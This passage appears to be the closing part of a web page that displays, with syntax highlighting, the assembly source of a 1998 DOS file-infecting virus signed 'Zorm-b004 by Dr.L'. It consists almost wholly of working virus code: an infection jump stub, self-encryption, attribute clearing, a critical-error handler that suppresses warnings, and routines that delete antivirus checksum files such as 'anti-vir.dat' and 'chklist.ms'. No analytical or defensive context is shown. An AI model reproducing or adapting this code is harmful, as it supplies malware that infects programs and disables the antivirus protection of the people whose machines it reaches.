                                   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">queue</span><span class="sc4">+(</span><span class="sc5">begin_2nd</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)+</span><span class="sc8">bp</span><span class="sc0">
                                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">
  
                                   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                                   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                                   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">set_attrib</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
                  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">kill_file</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
                  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">int_24h</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                  </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">set_dta</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
                  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">compute_delta</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
        </span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
                  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
                  </span><span class="sc6">ret</span><span class="sc0">
       </span><span class="sc5">go_end</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
                  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0"> 
                  </span><span class="sc6">cwd</span><span class="sc0">
                  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                  </span><span class="sc6">ret</span><span class="sc0">
                  
                  </span><span class="sc5">signature</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'(c)Zorm-b004 by Dr.L  March/July98'</span><span class="sc0">      
                  </span><span class="sc5">jmp_bytes</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'V'</span><span class="sc0">
                </span><span class="sc5">store_bytes</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                
                  </span><span class="sc5">killfile1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'anti-vir.dat'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                  </span><span class="sc5">killfile2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'chklist.ms'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                  </span><span class="sc5">killfile3</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'chklist.cps'</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                    </span><span class="sc5">dot_dot</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                  </span><span class="sc5">file_mask</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'goat*.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;anti-lamer routine</span><span class="sc0">
                   </span><span class="sc5">com_file</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'goat*.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  
                  
</span><span class="sc5">end_main</span><span class="sc4">:</span><span class="sc0">
 

</span><span class="sc5">end_virus</span><span class="sc4">:</span><span class="sc0">
                     </span><span class="sc5">com_target</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">            </span><span class="sc10">?</span><span class="sc0">
                     </span><span class="sc5">com_virus</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">            </span><span class="sc10">?</span><span class="sc0">
                      </span><span class="sc5">flag_com</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">            </span><span class="sc10">?</span><span class="sc0"> 
                          </span><span class="sc5">disk</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">            </span><span class="sc10">?</span><span class="sc0">  
                     </span><span class="sc5">attribute</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">            </span><span class="sc10">?</span><span class="sc0">
                    </span><span class="sc5">old_int24h</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">            </span><span class="sc10">?</span><span class="sc0">              
                           </span><span class="sc5">_ds</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">            </span><span class="sc10">?</span><span class="sc0">
                  </span><span class="sc5">count_infect</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">            </span><span class="sc10">?</span><span class="sc0">
                         </span><span class="sc5">slash</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">            </span><span class="sc10">?</span><span class="sc0">
                   </span><span class="sc5">current_dir</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">64</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                    </span><span class="sc5">exe_header</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                       </span><span class="sc5">new_dta</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">43</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                       </span><span class="sc5">new_dir</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">64</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">queue</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start1</span><span class="sc0">                                  </span></div></body>
</html>
